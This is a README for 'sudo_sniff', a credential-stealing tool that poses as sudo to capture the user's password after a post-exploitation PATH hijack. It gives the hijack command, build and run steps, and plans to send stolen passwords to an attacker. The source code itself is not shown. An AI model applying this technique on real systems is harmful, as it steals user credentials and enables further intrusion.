# sudo_sniff
sudo_sniff is a simple program that attempts to steal the user's password while running sudo without arousing any suspicion. The idea is to first modify the user's $PATH with `PATH="$HOME/.bin:$PATH"` and placing sudo_sniff in `$HOME/.bin/sudo`. This could be used in post-exploitation.

## Improvements
* Hide the victim's input
* Add function to either send the password to attacker or save it on disk
* [BUG] If the victim enters an incorrect password, the text asking for the password will be printed multiple times.

## Usage
1. git clone git@github.com:mjdubell/sudo_sniff.git
2. cd sudo_sniff/
3. gcc -Wall sudo_sniff.c -o sudo
4. ./sudo

## Contributing
1. Fork it!
2. Create your feature branch: `git checkout -b my-new-feature`
3. Commit your changes: `git commit -am 'Add some feature'`
4. Push to the branch: `git push origin my-new-feature`
5. Submit a pull request :D